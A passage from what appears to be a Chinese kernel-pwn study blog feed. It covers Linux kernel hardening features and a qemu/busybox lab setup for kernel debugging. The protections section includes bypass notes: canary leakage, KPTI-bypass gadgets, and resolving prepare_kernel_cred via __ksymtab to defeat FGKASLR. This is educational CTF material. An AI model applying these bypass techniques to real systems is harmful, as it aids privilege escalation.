，从而导致使用这两种 flag 的 object 之间的隔离。</li></ul><h6 id="SLAB-ACCOUNT"><a href="#SLAB-ACCOUNT" class="headerlink" title="SLAB_ACCOUNT"></a>SLAB_ACCOUNT</h6><p>如果在使用 <code>kmem_cache_create</code> 创建一个 <code>cache</code> 时，传递了 <code>SLAB_ACCOUNT</code> 标记，那么这个 <code>cache</code> 就会单独存在，不会与其它相同大小的 <code>cache</code> 合并。在早期，许多结构体（如 <strong><code>cred</code> 结构体</strong>）对应的堆块并不单独存在，会和相同大小的堆块使用相同的 <code>cache</code>。在 <code>Linux 4.5</code> 版本引入了这个 <code>flag</code> 后，许多结构体就单独使用了自己的 <code>cache</code></p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>使得内核中相应的对象具有一定的访问控制要求，比如不可写，或者不可读</p><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><h5 id="dmesg-restrict"><a href="#dmesg-restrict" class="headerlink" title="dmesg_restrict"></a>dmesg_restrict</h5><p>内核日志有一些地址信息或者敏感信息，因此对<strong>内核日志</strong>的访问进行限制</p><p>该选项用于控制是否可以使用 <code>dmesg</code> 来<strong>查看内核日志</strong>。当 <code>dmesg_restrict</code> 为<code>0</code>时，没有任何限制；当该选项为 1 时，只有具有 <code>CAP_SYSLOG</code> 权限的用户才可以通过 <code>dmesg</code> 命令来查看内核日志</p><h5 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h5><p>在<strong>输出内核地址</strong>时施加的限制，主要限制通过 <code>/proc</code> 获取的内核地址</p><p>选项配置:</p><ul><li><code>0</code>：默认情况下，没有任何限制</li><li><code>1</code>：使用 <code>％pK</code> 输出的内核指针地址将被替换为 <code>0</code>，除非用户具有 <code>CAP_ SYSLOG</code> 特权，并且 <code>group id</code> 和真正的 <code>id</code> 相等</li><li><code>2</code>：使用 <code>％pK</code> 输出的内核指针都将被替换为 <code>0</code> ，<strong>与权限无关</strong></li></ul><p>当开启该保护后，攻击者就不能通过 <code>/proc/kallsyms</code> 来获取内核中某些敏感的地址了，如 <code>commit_creds</code>、<code>prepare_kernel_cred</code></p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><h5 id="ro-after-init"><a href="#ro-after-init" class="headerlink" title="__ro_after_init"></a>__ro_after_init</h5><p>使用 <code>__ro_after_init</code> 标记在 <code>__init</code> 阶段被初始化且初始化后就不会改变的内存，在 <code>init</code> 阶段结束后，不能够被再次修改</p><p>我们可以使用 <code>set_memory_rw(unsigned long addr, int numpages)</code> 来修改对应页的权限</p><h5 id="mmap-min-addr"><a href="#mmap-min-addr" class="headerlink" title="mmap_min_addr"></a>mmap_min_addr</h5><p><code>mmap_min_addr</code> 是用来对抗 <code>NULL Pointer Dereference</code> 的，指定用户进程通过 <code>mmap</code> 可以使用的最低的虚拟内存地址</p><h3 id="异常检测"><a href="#异常检测" class="headerlink" title="异常检测"></a>异常检测</h3><h4 id="Kernel-Stack-Canary"><a href="#Kernel-Stack-Canary" class="headerlink" title="Kernel Stack Canary"></a>Kernel Stack Canary</h4><p><strong>开启</strong>：开启编译选项<code>CONFIG_CC_STACKPROTECTOR</code></p><p><strong>关闭</strong>：重新编译内核，并关闭编译选项</p><p><strong>状态检查</strong>：<code>checksec</code></p><p><strong>特点</strong>：<code>x86</code> 架构下同一个 <code>task</code> 共享 <code>Canary</code></p><p><strong>攻击</strong>：只要泄露一次系统调用中的<code>canary</code>，同一<code>task</code>的其他系统调用中的<code>canary</code>就都被泄露了</p><h3 id="随机化"><a href="#随机化" class="headerlink" title="随机化"></a>随机化</h3><h4 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4><p>内核的代码段基地址等地址会整体偏移</p><p><strong>开启</strong>：<code>-append kaslr</code></p><p><strong>关闭</strong>：<code>-append nokaslr</code></p><p><strong>攻击</strong>：泄露某个段的地址得到该段的基址</p><h4 id="FGKASLR"><a href="#FGKASLR" class="headerlink" title="FGKASLR"></a>FGKASLR</h4><p>在<code>KASLR</code>基础上，在加载时刻以函数粒度重新排布内核代码</p><p><strong>特点</strong>：<code>.text</code>参与随机化，<code>.data</code>不参与随机化</p><p><strong>开启</strong>:开启<code>CONFIG_FG_KASLR=y</code>选项</p><p><strong>关闭</strong>：<code>nokaslr</code>会同时关闭<code>FGKASLR</code>，也可以单独使用<code>nofgkaslr</code></p><p><strong>缺点</strong>：</p><ul><li>函数粒度随机化，如果函数内的某个地址知道了，函数内部的相对地址也就知道了</li><li><code>.text</code>节区不参与函数随机化，一旦知道其中的某个地址，就可以获取该节区所有的地址。系统调用的入口代码都在该节区内，且该节区具有以下 <code>gadget</code><ul><li><code>swapgs_restore_regs_and_return_to_usermode</code>，用于绕过 KPTI 防护</li><li><code>memcpy</code> 内存拷贝</li><li><code>sync_regs</code>，可以把 <code>RAX</code> 放到 <code>RDI</code> 中</li></ul></li><li><code>__ksymtab</code>相对于内核镜像的偏移是固定的，如果我们可以泄露数据，那就可以泄露出其它的符号地址，如 <code>prepare_kernel_cred</code>、<code>commit_creds</code><ul><li>基于内核镜像地址获取 <code>__ksymtab</code> 地址</li><li>基于 <code>__ksymtab</code> 获取对应符号记录项的地址</li><li>根据符号记录项中具体的内容来获取对应符号的地址</li></ul></li><li><code>data</code> 节区相对于内核镜像的偏移是固定的。因此在获取了内核镜像的基地址后，就可以计算出数据区数据的地址，这个节区有一些重要数据比如<code>modprobe_path</code></li></ul><p><code>__ksymtab</code> 格式</p><p><code>__ksymtab</code> 中每个记录项的名字的格式为 <code>__ksymtab_func_name</code>，以 <code>prepare_kernel_cred</code> 为例，对应的记录项的名字为<code>__ksymtab_prepare_kernel_cred</code>，因此，我们可以直接通过该名字在 IDA 里找到对应的位置，如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">__ksymtab:FFFFFFFF81F8D4FC __ksymtab_prepare_kernel_cred dd 0FF5392F4h__ksymtab:FFFFFFFF81F8D500                 dd 134B2h__ksymtab:FFFFFFFF81F8D504                 dd 1783Eh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>__ksymtab</code> 每一项的结构为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">kernel_symbol</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> value_offset<span class="token punctuation">;</span>    <span class="token keyword">int</span> name_offset<span class="token punctuation">;</span>    <span class="token keyword">int</span> namespace_offset<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个表项记录了重定位表项相对于当前地址的偏移。那么，<code>prepare_kernel_cred</code> 的地址应该为 <code>0xFFFFFFFF81F8D4FC-(2**32-0xFF5392F4)=0xffffffff814c67f0</code></p><p>即<code>__ksymtab_prepare_kernel_cred addr - (2 ** 32 - __ksymtab_prepare_kernel_cred)</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text.prepare_kernel_cred:FFFFFFFF814C67F0                 public prepare_kernel_cred.text.prepare_kernel_cred:FFFFFFFF814C67F0 prepare_kernel_cred proc near           ; CODE XREF: sub_FFFFFFFF814A5ED5+52↑p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode">https://ctf-wiki.org/pwn/linux/kernel-mode</a></p><p><a href="https://www.z1r0.top/2021/11/21/kernel-pwn%EF%BC%88%E4%B8%89%EF%BC%89%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6/#%E7%BC%BA%E7%82%B9">https://www.z1r0.top/2021/11/21/kernel-pwn%EF%BC%88%E4%B8%89%EF%BC%89%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6/#%E7%BC%BA%E7%82%B9</a></p><p><a href="https://www.z1r0.top/2021/10/29/kernel-pwn%EF%BC%88%E4%BA%8C%EF%BC%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#/">https://www.z1r0.top/2021/10/29/kernel-pwn%EF%BC%88%E4%BA%8C%EF%BC%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;内核基础知识&quot;&gt;&lt;a href=&quot;#内核基础知识&quot; class=&quot;headerlink&quot; title=&quot;内核基础知识&quot;&gt;&lt;/a&gt;内核基础知识&lt;/h2&gt;&lt;h3 id=&quot;kernel&quot;&gt;&lt;a href=&quot;#kernel&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="kernel" scheme="https://starrysky1004.github.io/categories/kernel/"/>
    
    
    <category term="kernel" scheme="https://starrysky1004.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>kernel环境配置</title>
    <link href="https://starrysky1004.github.io/2024/03/09/kernel-huan-jing-pei-zhi/kernel-huan-jing-pei-zhi/"/>
    <id>https://starrysky1004.github.io/2024/03/09/kernel-huan-jing-pei-zhi/kernel-huan-jing-pei-zhi/</id>
    <published>2024-03-09T07:11:50.000Z</published>
    <updated>2024-03-10T12:57:36.185Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下配置kernel环境过程中遇到的一些问题</p><h2 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h2><h3 id="内核下载"><a href="#内核下载" class="headerlink" title="内核下载"></a>内核下载</h3><p>网上一些文章用的清华源，但是现在好像…</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-cn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>我们检测到您所在的子网和/或所使用的客户端存在大量下载某些较大二进制文件的行为，为保证用户的正常使用，我们阻断了此类请求。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以网上找到了其他下载<a href="https://cdn.kernel.org/pub/linux/kernel/v5.x/#/%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%9B%A0%E4%B8%BA%E6%84%9F%E8%A7%89%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%A5%BD%E6%85%A2%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%9C%A8%60windows%60%E4%B8%8A%E4%B8%8B%E8%BD%BD%E4%BA%86%E6%8B%96%E8%BF%9B%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BA%86">https://cdn.kernel.org/pub/linux/kernel/v5.x/#/，不过因为感觉下载的好慢，直接在`windows`上下载了拖进虚拟机了</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-O</span> <span class="token parameter variable">-L</span> https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.4.98.tar.xzunxz linux-5.4.98.tar.xz<span class="token function">tar</span> <span class="token parameter variable">-xf</span> linux-5.4.98.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样就得到了内核源码，因为长期版稳定便于学习所以选择了<code>5.4.98</code>版本的内核</p><h3 id="内核编译"><a href="#内核编译" class="headerlink" title="内核编译"></a>内核编译</h3><p>直接<code>make</code>报错了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">☁  linux-5.4.98  <span class="token function">sudo</span> <span class="token function">make</span> menuconfig                                                     <span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> starrysky 的密码：   LEX     scripts/kconfig/lexer.lex.c/bin/sh: <span class="token number">1</span>: flex: not foundmake<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: *** <span class="token punctuation">[</span>scripts/Makefile.host:9：scripts/kconfig/lexer.lex.c<span class="token punctuation">]</span> 错误 <span class="token number">127</span>make: *** <span class="token punctuation">[</span>Makefile:590：menuconfig<span class="token punctuation">]</span> 错误 <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要先安装<code>flex</code>和<code>bison</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> flex<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> bison<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>进入菜单，在菜单中选择<code>Kernel hacking -&gt; Compile-time checks and compiler options</code>并且勾选<code>Compile the kernel with debug info</code>，全选<code>Kernel debugging</code>中全部内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">☁  linux-5.4.98  <span class="token function">sudo</span> <span class="token function">make</span> menuconfig       <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开始编译内核</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">make</span> <span class="token parameter variable">-j</span> <span class="token number">4</span>  bzImage<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中会遇到一些问题，解决方法：</p><ul><li><p><code>.config</code> 第<code>9868</code>行置空（不删除此行</p><pre class="line-numbers language-none"><code class="language-none">CONFIG_SYSTEM_TRUSTED_KEYS&#x3D;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>安装<code>libelf-dev</code>和<code>dwarves</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libelf-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> dwarves<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><p>最后显示如下内容表示编译成功</p><pre class="line-numbers language-none"><code class="language-none">Setup is 18044 bytes (padded to 18432 bytes).System is 15045 kBCRC 815d9126Kernel: arch&#x2F;x86&#x2F;boot&#x2F;bzImage is ready  (#2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在编译成功后，我们一般主要关注于如下的文件</p><ul><li><code>bzImage</code>：<code>arch/x86/boot/bzImage</code></li><li><code>vmlinux</code>：源码所在的根目录下。</li></ul><p>常见内核文件的介绍:</p><ul><li><strong>bzImage</strong>：目前主流的 <code>kernel</code> 镜像格式，适用于较大的（<code>&gt; 512 KB</code>） <code>Kernel</code>。这个镜像会被加载到内存的高地址(高于 <code>1MB</code>)。<code>bzImage</code> 是用 <code>gzip</code> 压缩的，不能用 <code>gunzip</code> 来解压</li><li><strong>zImage</strong>：比较老的 <code>kernel</code> 镜像格式，适用于较小的<code>Kernel</code>。启动时，这个镜像会被加载到内存的低地址，即内存的前 <code>640 KB</code>。<code>zImage</code> 也不能用 <code>gunzip</code> 来解</li><li><strong>vmlinuz</strong>：<code>vmlinuz</code> 不仅包含了压缩后的 <code>vmlinux</code>，还包含了 <code>gzip</code> 解压缩的代码。实际上就是 <code>zImage</code> 或者 <code>bzImage</code> 文件。该文件是 <code>bootable</code> 的,即它能够把内核加载到内存中。对于 <code>Linux</code> 系统而言，该文件位于 <code>/boot</code> 目录下,该目录包含了启动系统时所需要的文件</li><li><strong>vmlinux</strong>：静态链接的 <code>Linux kernel</code>，以可执行文件的形式存在，尚未经过压缩。该文件往往是在生成 <code>vmlinuz</code> 的过程中产生的。该文件适合调试,但不是 bootable </li><li><strong>vmlinux.bin</strong>：也是静态链接的 <code>Linux kernel</code>，只是以一个可启动的 (<code>bootable</code>) 二进制文件存在。所有的符号信息和重定位信息都被删除了。生成命令为：<code>objcopy -O binary vmlinux vmlinux.bin</code>。</li><li><strong>uImage</strong>：<code>uImage</code> 是 <code>U-boot</code> 专用的镜像文件，它是在 <code>zImage</code> 之前加上了一个长度为 <code>0x40</code> 的 <code>tag</code> 而构成的。这个 <code>tag</code> 说明了这个镜像文件的类型、加载位置、生成时间、大小等信息</li></ul><h3 id="编译内核驱动"><a href="#编译内核驱动" class="headerlink" title="编译内核驱动"></a>编译内核驱动</h3><p><code>c</code>语言源码<code>pwn.c</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/init.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"Dual BSD/GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">ko_test_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"This is a test ko!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ko_test_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Bye Bye~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>ko_test_init<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>ko_test_exit<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Makefile</code>文件</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">+=</span> pwn.oKDIR <span class="token operator">=</span>/home/starrysky/kernel/linux-5.4.98<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KDIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>PWD<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span>rm -rf *.o *.ko *.mod.* *.symvers *.order<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>obj-m</code>指定了要声称的模块，后面接<code>c</code>源码文件名<code>.o</code>，<code>KDIR</code>为内核源码路径</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KDIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>PWD<span class="token punctuation">)</span> modules<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>-C</code> 表示进入到指定的内核目录</p><p><code>M</code> 指定驱动源码的环境，<code>M</code>并不是 <code>Makefile</code> 的选项，而是内核根目录下 <code>Makefile</code> 中使用的变量。这会使得该 <code>Makefile</code> 在构造模块之前返回到 <code>M</code> 指定的目录，并在指定的目录中生成驱动模块</p><p>最后运行<code>sudo make</code>编译内核驱动</p><pre class="line-numbers language-none"><code class="language-none">☁  pwn  lsMakefile  modules.order  Module.symvers  pwn.c  pwn.ko  pwn.mod  pwn.mod.c  pwn.mod.o  pwn.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>虽然正常人不会这样但是要注意文件名不要用<code>make</code>（嗯我就是那个非正常人类</p><h2 id="Qemu-模拟环境"><a href="#Qemu-模拟环境" class="headerlink" title="Qemu 模拟环境"></a>Qemu 模拟环境</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>安装<code>qemu</code>和<code>busybox</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu<span class="token function">wget</span> https://busybox.net/downloads/busybox-1.32.1.tar.bz2<span class="token function">tar</span> <span class="token parameter variable">-jxf</span> busybox-1.32.1.tar.bz2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>配置<code>busybox</code>,在 <code>Setttings</code> 选中 <code>Build static binary (no shared libs)</code>，将 <code>busybox</code> 编译为静态链接的文件；在 <code>Linux System Utilities</code> 中取消选中 <code>Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)；</code>在 <code>Networking Utilities</code> 中取消选中 <code>inetd</code>，最后编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> menuconfig<span class="token function">make</span> <span class="token parameter variable">-j</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="配置文件系统"><a href="#配置文件系统" class="headerlink" title="配置文件系统"></a>配置文件系统</h3><p>使用 <code>make install</code>命令，将生成文件夹<code>_install</code>，该目录将成为 <code>rootfs</code>，在该文件夹下创建文件夹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token parameter variable">-p</span>  proc sys dev etc/init.d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再创建一个<code>init</code>文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token builtin class-name">echo</span> <span class="token string">"INIT SCRIPT"</span><span class="token function">mkdir</span> /tmp<span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs none /dev<span class="token function">mount</span> <span class="token parameter variable">-t</span> debugfs none /sys/kernel/debug<span class="token function">mount</span> <span class="token parameter variable">-t</span> tmpfs none /tmp<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds"</span>setsid /bin/cttyhack setuidgid <span class="token number">0</span> /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打包文件系统</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span> cpio <span class="token parameter variable">-o</span> <span class="token parameter variable">--format</span><span class="token operator">=</span>newc <span class="token operator">></span> <span class="token punctuation">..</span>/rootfs.img<span class="token comment"># 解包命令</span><span class="token comment"># cpio -idmv &lt; rootfs.img</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="启动内核"><a href="#启动内核" class="headerlink" title="启动内核"></a>启动内核</h3><p>脚本如下，<code>bzImage</code>就是之前内核里的<code>bzImage</code>,<code>rootfs.img</code>是打包文件系统时（上一步）创建的，<code>nographic</code>关闭了图形界面，<code>console=ttyS0</code>将输出重定向到了终端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>  <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>  <span class="token parameter variable">-kernel</span> <span class="token punctuation">..</span>/arch/x86/boot/bzImage <span class="token punctuation">\</span>  <span class="token parameter variable">-initrd</span> ./rootfs.img <span class="token punctuation">\</span>  <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 kaslr"</span> <span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就启动好了</p><pre class="line-numbers language-none"><code class="language-none">INIT SCRIPTBoot took 6.24 seconds&#x2F; # lsbin      etc      linuxrc  root     sys      usrdev      init     proc     sbin     tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h3><p>将之前写的驱动复制到<code>_install</code>文件夹下，改一下<code>init</code>文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token builtin class-name">echo</span> <span class="token string">"INIT SCRIPT"</span><span class="token function">mkdir</span> /tmp<span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs none /dev<span class="token function">mount</span> <span class="token parameter variable">-t</span> debugfs none /sys/kernel/debug<span class="token function">mount</span> <span class="token parameter variable">-t</span> tmpfs none /tmpinsmod /1.ko<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds"</span>setsid /bin/cttyhack setuidgid <span class="token number">0</span> /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重新打包再运行，可以看到加载成功了，显示了<code>This is a test ko!</code></p><pre class="line-numbers language-none"><code class="language-none">INIT SCRIPT[    6.129377] pwn: loading out-of-tree module taints kernel.[    6.133147] pwn: module verification failed: signature and&#x2F;or required key missing - tainting kernel[    6.147188] This is a test ko!Boot took 6.13 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>查看装载的驱动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lsmod<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取驱动加载的基地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> target_module_name /proc/modules <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h3><p>在启动脚本里加<code>-s</code>，表示<code>-gdb tcp::1234</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>  <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>  <span class="token parameter variable">-kernel</span> <span class="token punctuation">..</span>/arch/x86/boot/bzImage <span class="token punctuation">\</span>  <span class="token parameter variable">-initrd</span> ./rootfs.img <span class="token punctuation">\</span>  <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 kaslr"</span> <span class="token punctuation">\</span>  <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>启动之后<code>gdb</code>连接上去调试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb <span class="token parameter variable">-q</span> <span class="token parameter variable">-ex</span> <span class="token string">"target remote localhost:1234"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg: loaded <span class="token number">147</span> pwndbg commands and <span class="token number">47</span> shell commands. Type pwndbg <span class="token punctuation">[</span>--shell <span class="token operator">|</span> --all<span class="token punctuation">]</span> <span class="token punctuation">[</span>filter<span class="token punctuation">]</span> <span class="token keyword">for</span> a list.pwndbg: created <span class="token variable">$rebase</span>, <span class="token variable">$ida</span> GDB functions <span class="token punctuation">(</span>can be used with print/break<span class="token punctuation">)</span>Remote debugging using localhost:1234warning: No executable has been specified and target does not supportdetermining executable automatically.  Try using the <span class="token string">"file"</span> command.0xffffffffa1dfea1e <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>------- tip of the day <span class="token punctuation">(</span>disable with <span class="token builtin class-name">set</span> show-tips off<span class="token punctuation">)</span> -------Use GDB's dprintf <span class="token builtin class-name">command</span> to print all calls to given function. E.g. dprintf malloc, <span class="token string">"malloc(%p)<span class="token entity" title="\n">\n</span>"</span>, <span class="token punctuation">(</span>void*<span class="token punctuation">)</span><span class="token variable">$rdi</span> will print all malloc callsPermission error when attempting to parse page tables with gdb-pt-dump.Either change the kernel-vmmap setting, re-run GDB as root, or disable <span class="token variable"><span class="token variable">`</span>ptrace_scope<span class="token variable">`</span></span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /proc/sys/kernel/yama/ptrace_scope<span class="token variable">`</span></span><span 